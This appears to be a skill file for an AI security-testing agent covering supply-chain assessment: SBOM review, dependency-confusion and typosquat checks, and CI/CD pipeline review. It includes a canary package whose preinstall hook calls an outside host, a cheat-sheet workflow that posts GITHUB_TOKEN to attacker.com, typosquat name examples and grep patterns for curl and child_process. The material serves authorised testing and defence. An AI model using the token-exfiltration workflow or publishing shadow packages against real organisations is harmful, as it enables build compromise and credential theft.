---
name: supply-chain
domain: supply-chain
category: supply-chain
tier: balanced
description: Review SBOMs, triage malicious packages, detect dependency confusion, and assess CI/CD supply-chain attack exposure.
toolRefs:
  - httpRequest
  - parseResponse
  - recordEvidence
  - writeFinding
  - getTargetSummary
  - runRecon
triggers:
  - sbom dependency review
  - malicious package triage
  - dependency confusion attack
  - ci cd supply chain compromise
  - software bill of materials audit
contextBoosts: []
toolChains: []
compositionRules: {}
mitreAttack:
  - T1195
  - T1195.001
  - T1195.002
  - T1195.003
owaspRefs:
  - A06:2021
  - A08:2021
---

# Supply-Chain Security Assessment

## When to Use
Use when reviewing an application's dependency tree, SBOM, package manifests, or CI/CD pipeline configuration. Trigger on requests to audit third-party risk, identify typosquatted or malicious packages, or evaluate whether internal package namespaces are reachable by public registries.

## Detection Approach
1. **Obtain the manifest / SBOM.** Locate `package-lock.json`, `pom.xml`, `go.mod`, SBOM exports, or build artifacts. Parse declared and transitive dependencies.
2. **Pinpoint external exposure.** Enumerate which registries (npm, PyPI, Maven, RubyGems) the build pulls from and whether internal/private package names are also claimable publicly.
3. **Test dependency confusion.** For each private/internal package name, check the public registry for a same-named package at a higher version. If installers resolve public over private by version, confusion is exploitable.
4. **Triage malicious packages.** Score packages by install scripts (`preinstall`, `postinstall`), obfuscated payloads, unexpected network egress, maintainer turnover, and typosquat similarity to popular names.
5. **Assess CI/CD exposure.** Review pipeline definitions for unpinned base images, unverified third-party actions/plugins, secrets passed to external steps, and write-access to artifact stores.
6. **Switch logic.** If the SBOM is absent, request generation or reconstruct from lockfiles; if confusion is blocked, pivot to malicious-package social-engineering vectors.

## Reconnaissance Commands

### Manifest + Lockfile Extraction

```bash
find . -maxdepth 3 -name "package.json" -o -name "package-lock.json" \
  -o -name "yarn.lock" -o -name "requirements*.txt" -o -name "Pipfile*" \
  -o -name "go.mod" -o -name "pom.xml" -o -name "*.csproj" 2>/dev/null
```

### Dependency Tree with Registry Sources

```bash
npm ls --all --json > deps.json
grep -o '"resolved": "[^"]*"' package-lock.json | sort -u
```

Flag any `resolved` URL pointing at public registries for packages that should be private.

### SBOM Generation

```bash
npx @cyclonedx/cyclonedx-npm --output-file sbom.json
syft dir:. -o cyclonedx-json > sbom.json
```

## Dependency Confusion Testing

### Public-Registry Shadow Check

For each private name, check if it exists publicly:

```bash
for pkg in $(jq -r '.packages[].location // empty' private-names.txt); do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://registry.npmjs.org/$pkg")
  [ "$code" = "200" ] && echo "PUBLIC SHADOW: $pkg"
done
```

Same for PyPI:

```bash
curl -s -o /dev/null -w "%{http_code}\n" https://pypi.org/pypi/<internal-name>/json
```

### Canary Package Validation

Register the internal name publicly with a harmless placeholder that phones home on install:

```json
{
  "name": "<internal-package-name>",
  "version": "99.99.99",
  "scripts": {
    "preinstall": "curl -s https://canary.example.com/hit?pkg=$npm_package_name"
  }
}
```

`npm publish` — if any build installs it, dependency confusion is CONFIRMED with build-server callback evidence.

## Malicious Package Triage

### Install-Script Audit

```bash
npm view <pkg> scripts
cat node_modules/<pkg>/package.json | jq '.scripts'
```

Any `preinstall`/`postinstall` invoking `curl`, `wget`, `node -e`, base64 blobs, or child_process is suspect:

```bash
grep -rE "(curl|wget|child_process|eval|exec|atob|Buffer.from\(['\"]...)" node_modules/<suspect>/ --include="*.js" -l
```

### Typosquat Similarity

```python
from difflib import get_close_matches
popular = ["express", "lodash", "react", "requests", "boto3"]
print(get_close_matches("<candidate>", popular, cutoff=0.85))
```

Also check Levenshtein distance ≤ 2 against top-1000 names and lookalike Unicode homoglyphs.

### Maintainer + Publish Metadata

```bash
npm view <pkg> maintainers time.created time.modified dist.unpackedSize
```

Newly created + single maintainer + recent republish of an abandoned popular name = classic account-takeover pattern.

## CI/CD Exposure Assessment

### pull_request_target Misuse (GitHub Actions)

Dangerous pattern — checkout of untrusted PR code running with repo secrets:

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}   # attacker-controlled
      - run: npm install        # executes attacker's postinstall WITH secrets
        env:
          API_TOKEN: ${{ secrets.API_TOKEN }}             # exposed to PR author
```

### Pipeline Hygiene Checks

```bash
# Unpinned third-party actions (tag instead of SHA)
grep -rE "uses:\s+[^\s]+@[a-z]+" .github/workflows/
# Secrets leaking into fork-visible steps
grep -rn "secrets\." .github/workflows/ | grep -v "push:"
```

Verify base images are digest-pinned (`image@sha256:...`) and artifact registries require authentication.

## Pitfalls
- Trusting lockfile integrity without checking resolved registry source.
- Missing transitive dependencies hidden behind scoped aliases.
- Assuming private registry names are secret — names are often guessable from public repos.
- Overlooking post-install scripts as the execution primitive.

## Verification & Impact
- **Confirmed:** A public package shadows an internal name at higher version; an install script performs egress or writes to disk; a pipeline step pulls unverified remote code.
- **Suspected:** Unpinned dependencies, absent SBOM, or unreviewed third-party plugins.
- Document impact as code execution at build, credential theft, or downstream artifact poisoning. Use `writeFinding` with resolved evidence.

## Key Concepts
| Term | Meaning |
|------|---------|
| SBOM | Software Bill of Materials |
| Dependency confusion | Public pkg overrides private by version |
| Typosquatting | Name mimicking a popular package |
| Transitive dep | Dependency of a dependency |

---

## Cheat Sheet — Supply Chain Attacks

### Dependency Confusion

```bash
# Check for internal package names in public registries
npm search @company-name 2>/dev/null
pip search company-name 2>/dev/null

# Publish shadow package (safe PoC — use callback only)
# npm: npm publish --access public
# PyPI: twine upload dist/*

# Test with safe callback
# Use interactsh or Burp Collaborator for OOB confirmation
```

### Typosquatting

```bash
# Popular packages to typosquat
# lodash → lodas, lodashs, lodashjs
# express → experss, expresss, expressjs
# axios → axois, axioss, axio

# Automated discovery
npm audit signatures
```

### GitHub Actions Abuse

```yaml
# workflow_run trigger (runs after another workflow)
# Attacker pushes to PR → triggers CI → workflow_run fires
# Access GITHUB_TOKEN with repo write permissions

# Example malicious workflow
on:
  workflow_run:
    workflows: ["CI"]
    types: [completed]
jobs:
  steal:
    runs-on: ubuntu-latest
    steps:
      - run: curl -X POST https://attacker.com/token -d "$GITHUB_TOKEN"
```

### Artifact Signing Bypass

```bash
# Check if artifacts are signed
cosign verify --key cosign.pub artifact

# If unsigned: replace in transit
# If weakly signed: test key management
```
